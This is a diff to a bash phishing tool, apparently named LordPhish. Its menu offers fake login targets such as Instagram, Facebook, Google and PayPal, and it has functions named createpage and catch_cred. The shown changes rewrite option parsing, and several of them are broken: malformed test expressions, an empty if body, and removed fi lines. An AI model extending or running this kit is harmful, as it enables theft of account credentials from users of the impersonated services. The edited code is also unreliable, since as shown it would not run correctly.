@@ -64,35 +64,35 @@ printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
-if [[ $option == 1 || $option == 01 ]]; then
+if [[ $option == 1 ]]; then
 server="instagram"
 start
 
-elif [[ $option == 2 || $option == 02 ]]; then
+elif [[ $option == 2 ]]; then
 server="facebook"
 start
-elif [[ $option == 3 || $option == 03 ]]; then
+elif [[ $option == 3 ]]; then
 server="snapchat"
 start
-elif [[ $option == 4 || $option == 04 ]]; then
+elif [[ $option == 4 ]]; then
 server="twitter"
 start
-elif [[ $option == 5 || $option == 05 ]]; then
+elif [[ $option == 5 ]]; then
 server="github"
 start
-elif [[ $option == 6 || $option == 06 ]]; then
+elif [[ $option == 6 ]]; then
 server="google"
 list_g
 
-elif [[ $option == 7 || $option == 07 ]]; then
+elif [[ $option == 7 ]]; then
 server="spotify"
 start
 
-elif [[ $option == 8 || $option == 08 ]]; then
+elif [[ $option == 8 ]]; then
 server="netflix"
 start
 
-elif [[ $option == 9 || $option == 09 ]]; then
+elif [[ $option == 9 ]]; then
 server="paypal"
 start
 
@@ -307,42 +307,13 @@ list_g() {
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to pc\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile\e[0m\n"
     read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' oofic
-if [[ $option == 1 ]]; then
+if [[ $option == "1" || $option "01"]]; then
 server="Google_pc"
 start
     
-if [[ $option == 2 ]]; then
-list_gm
+if [[ $option == "2" || $option "02"]]; then
 
-else
-printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;96m Invalid option\e[0m\n"
-sleep 0.9
-clear
-menu
-fi
-}
-
-list_gm() {
-    clear
-    banner
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile1 \e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile2 \e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' list_gm
     
-if [[ $option == 1 ]]; then
-server="Google_mobile"
-start
-    
-if [[ $option == 2 ]]; then
-server="Google_mobile2"
-start
-
-else
-printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;96m Invalid option\e[0m\n"
-sleep 0.9
-clear
-menu
-fi
 }
 
 createpage() {
@@ -424,7 +395,6 @@ printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;96m Invalid option\e[0m\n
 
 clear
 menu
-fi
 }
 
 catch_cred() {
